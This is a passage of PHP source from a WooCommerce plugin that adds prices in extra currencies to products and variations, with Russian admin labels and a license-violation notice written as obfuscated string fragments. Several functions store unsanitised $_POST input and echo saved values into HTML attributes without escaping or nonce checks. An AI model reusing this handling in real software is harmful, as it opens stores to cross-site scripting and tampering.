				$product_price =  '<span class="_amount">' . sprintf( $format, $this->get_woocommerce_currency_symbol_curr( $obj ), number_format( ($kurs * $product->get_price()), $this->num_decimals, $this->decimal_sep, $this->thousand_sep) ) . '</span>';
				$price .= $_FFF;
				$price .= $product_price;

				$price = apply_filters( 'woocommerce_variation_price_html', $price, $product );

			}
		} elseif ( $_price === '' ) {

			$price = apply_filters( 'woocommerce_variation_empty_price_html', '', $product );

		} elseif ( $_price == 0 ) {
			$price = isset($price) ? $price : '';
			$_FFF = isset($_FFF) ? $_FFF : '';
			if ( $product->is_on_sale() && isset( $regular_price ) ) {
				$price .= $_FFF;
				$price .= $this->get_price_html_from_to( $regular_price , __( 'Free!', 'woocommerce' ) );

				$price = apply_filters( 'woocommerce_variation_sale_price_html', $price, $product );

			} else {

				$price = __( 'Free!', 'woocommerce' );

				$price = apply_filters( 'woocommerce_variation_free_price_html', $price, $product );

			}
		}
		return apply_filters( 'woocommerce_get_price_html', $price, $product );
	}
	function _woocommerce_product_options_pricing_s_opt_price( ) {
		// Price
		?>
		<div class="inline error"><p class="form-field _logged_price_field "><strong><?php _e( 'Цены для авторизированых отключены', 'woocommerce' ); ?></strong>: <?php _e( 'Ha'.'p'.'y'.'шe'.'ни'.'e л'.'иц'.'eнз'.'ии'.'. Д'.'л'.'я pa'.'бo'.'ты св'.'яж'.'ит'.'ес'.'ь с p'.'азp'.'aб'.'oт'.'чи'.'кo'.'м.', 'woocommerce' ); ?></p></div> <?php
	}
	function get_woocommerce_price_format() {
		if ( version_compare( WOOCOMMERCE_VERSION, '2.0', '<' ) ) {
			$currency_pos = get_option( 'woocommerce_currency_pos' );

			switch ( $currency_pos ) {
				case 'left' :
					$format = '%1$s%2$s';
				break;
				case 'right' :
					$format = '%2$s%1$s';
				break;
				case 'left_space' :
					$format = '%1$s&nbsp;%2$s';
				break;
				case 'right_space' :
					$format = '%2$s&nbsp;%1$s';
				break;
			}
			return apply_filters( 'woocommerce_price_format', $format, $currency_pos );
		} else {
			return get_woocommerce_price_format();
		}
	}
	function woocommerce_template_single_price_curr() {
		global $product;

				$twoo_valute = get_option("default_valute_shop_twoo",false);
				
				if($twoo_valute) {
					?>
					<p class="price _price" itemprop="price">
					
					<?php 
						echo $this->_get_price_html($product,  $twoo_valute);
					
					?>
					
					</p>
					<?php
				}
			
		
	}

 function woocommerce_product_after_variable_attributes_s_logged_price( $loop, $variation_data ) {

		echo '<tr><td colspan="2" style="border:1px dashed #AAD2F2"><table>';
		
		
		if( !is_array($this->cunent_valute) ) $this->cunent_valute = array('USD' => 8.2, 'EUR' => 11);
		foreach($this->cunent_valute as $code => $kurs) {
			
			if(isset($variation_data[ '_price_' . $code]))
			$opt_price 		= maybe_unserialize($variation_data['_price_' . $code][0]);

			if(isset($opt_price) && is_numeric($opt_price) && !empty($opt_price)) {
				$opt_price = array($opt_price);
			}
			if( isset($opt_price) &&  is_array($opt_price)) {
			
				foreach($opt_price as $k => $v) {
				if(empty($v))
				?>
													<tr>
														
														<td <?php if($k > 0) echo ' style="border-top:1px dashed #AAD2F2"';?>><label><?php echo sprintf(__('Цена для валюты  [%s]:', 'woocommerce'), $code); ?></label><input type="text" size="5" name="variable_<?php echo 'price_' . $code; ?>[<?php echo $loop; ?>][]" value="<?php if (isset($opt_price[$k])) echo $opt_price[$k]; ?>" /></td>
													</tr>	
				<?php
				}
				unset($opt_price);
			} else {
				?>
													<tr>
														<td><label><?php echo sprintf(__('Цена для валюты  [%s]:', 'woocommerce'), $code); ?></label><input type="text" size="5" name="variable_<?php echo 'price_' . $code; ?>[<?php echo $loop; ?>][]" value="" /></td>
													</tr>		
				<?php	
			}
			
		}
	?></table></td></tr>

 <?
 }

 function woocommerce_product_after_variable_attributes_js_s_logged_price() {
 		
		if( !is_array($this->cunent_valute) ) $this->cunent_valute = array('USD' => 8.2, 'EUR' => 11);
		foreach($this->cunent_valute as $code => $kurs) {
 ?>\
										<tr>\
											<td style="border-top:1px dashed #AAD2F2"><label><?php echo esc_js( sprintf(__('Цена для валюты  [%s]:', 'woocommerce'), $code) ); ?></label><input type="text" size="5" name="variable_<?php echo 'price_' . $code; ?>[' + loop + '][]" /></td>\
										</tr>\
<? 
	}
 }
  function woocommerce_process_product_meta_variable_s_logged_price($post_id) {
	global $woocommerce, $wpdb,$variation_id;
	if (isset($_POST['variable_sku'])) {
		
		if( !is_array($this->cunent_valute) ) $this->cunent_valute = array('USD' => 8.2, 'EUR' => 11);
		$min_variation_price = $min_variation_regular_price = $max_variation_price = $max_variation_regular_price = '';
		foreach($this->cunent_valute as $code => $kurs) {
			$_variable_logged_price = array();
			$variable_post_id 			= $_POST['variable_post_id'];
			$variable_logged_price			= $_POST['variable_' . 'price_' . $code];
			//var_dump($_POST['variable_' . 'price_' . $code]); exit;
			$max_loop = max( array_keys( $_POST['variable_post_id'] ) );
			
			for ( $i=0; $i <= $max_loop; $i++ ) {
				
				if ( ! isset( $variable_post_id[$i] ) ) continue;
		
				$variation_id = (int) $variable_post_id[$i];
				// Update post meta
				if(isset($variable_logged_price[$i]) && is_array($variable_logged_price[$i])) {
					foreach($variable_logged_price[$i] as $_key => $_value) {
						if(!empty( $_value )) {
							$_variable_logged_price[$i] = $_value;
						}
					}
				}
				if(isset($_variable_logged_price[$i]) )
				update_post_meta( $variation_id, '_price_' . $code, $_variable_logged_price[$i] );

				if(isset($_variable_logged_price[$i]) && is_numeric( $_variable_logged_price[$i] )) {

					$child_price = $child_regular_price = $_variable_logged_price[$i] * $kurs;

					if ( $child_price === '' && $child_regular_price === '' )
						continue;

					// Regular prices
					if ( $child_regular_price !== '' ) {
						if ( ! is_numeric( $min_variation_regular_price ) || $child_regular_price < $min_variation_regular_price ) {
							$min_variation_regular_price = $child_regular_price; $min_id = $variation_id;
							}
							

						if ( ! is_numeric( $max_variation_regular_price ) || $child_regular_price > $max_variation_regular_price ) {
							$max_variation_regular_price = $child_regular_price; $max_id = $variation_id;
							}
					}

					// Actual prices
					if ( $child_price !== '' ) {
						if ( $child_price > $max_variation_price )
							$max_variation_price = $child_price;

						if ( $min_variation_price === '' || $child_price < $min_variation_price )
							$min_variation_price = $child_price;
					}
				}
			}
		}
			update_post_meta( $post_id, '_price', round($min_variation_price, 2) );
			update_post_meta( $post_id, '_min_variation_price', round($min_variation_price , 2));
			update_post_meta( $post_id, '_max_variation_price', round($max_variation_price , 2));
			update_post_meta( $post_id, '_min_variation_regular_price', round($min_variation_regular_price , 2));
			update_post_meta( $post_id, '_max_variation_regular_price', round($max_variation_regular_price , 2));
			if(!empty($min_id)) {
				update_post_meta( $post_id, '_min_price_variation_id', $min_id);	
				update_post_meta( $post_id, '_min_regular_price_variation_id', $min_id);
			}
			if(!empty($max_id)) {
				update_post_meta( $post_id, '_max_price_variation_id', $max_id);
				update_post_meta( $post_id, '_max_regular_price_variation_id', $max_id);
			}
	}
  }
	function woocommerce_process_product_meta_s_logged_price($post_id, $post) {
		global $wpdb, $woocommerce, $woocommerce_errors;
			// Update post meta
		
		if( !is_array($this->cunent_valute) ) $this->cunent_valute = array('USD' => 8.2, 'EUR' => 11);
			
		foreach($this->cunent_valute as $code => $kurs) {
			unset($_logged_price);
			foreach($_POST['_price_' . $code] as $key => $value) {
				if(!empty($value)) {
					$_logged_price = stripslashes($value);
				}
			}
				
			if(isset($_logged_price)) {
				if(!($r = update_post_meta( $post_id, '_price_' . $code, $_logged_price ))) $r = add_post_meta( $post_id, '_price_' . $code, $_logged_price );
			} else {
				delete_post_meta( $post_id, '_price_' . $code );
			}
		}
	}
	
	function woocommerce_product_options_pricing_s_logged_price( ) {
	// Price
	global $thepostid, $post, $woocommerce;
	echo '<div style="border:1px dashed #AAD2F2;margin-bottom: 5px;">'; 
		$thepostid 		= empty( $thepostid ) ? $post->ID : $thepostid;
		
		if( !is_array($this->cunent_valute) ) $this->cunent_valute = array('USD' => 8.2, 'EUR' => 11);
			
		foreach($this->cunent_valute as $code => $kurs) {
			$opt_price 		= get_post_meta( $thepostid, '_price_' . $code, true );
			if(is_numeric($opt_price) && !empty($opt_price)) {
				$opt_price = array($opt_price);
			}
			if(is_array($opt_price)) {
				foreach($opt_price as $v) {
				?>
				<p class="form-field _logged_price_field "><label for="<?php echo '_price_' . $code;?>[]">Цена для валюты [<?php echo $code;?>]</label><input type="text" class="wc_input_price short" name="<?php echo '_price_' . $code;?>[]" id="<?php echo '_price_' . $code;?>[]" value="<?php echo $v; ?>" placeholder="0.00" /> </p>
				<?php
				}
			} else {
			?>
			<p class="form-field _logged_price_field "><label for="<?php echo '_price_' . $code;?>[]">Цена для валюты [<?php echo $code;?>]</label><input type="text" class="wc_input_price short" name="<?php echo '_price_' . $code;?>[]" id="<?php echo '_price_' . $code;?>[]" value="" placeholder="0.00" /> </p>
			<?php	
			}
		}
	
	echo '</div>'; ?>
	
	<?php
	}
 }
add_action('plugins_loaded', 'saphali_two_currency_gen_price_load');
function saphali_two_currency_gen_price_load() {
	new saphali_two_currency_genered_price();
}
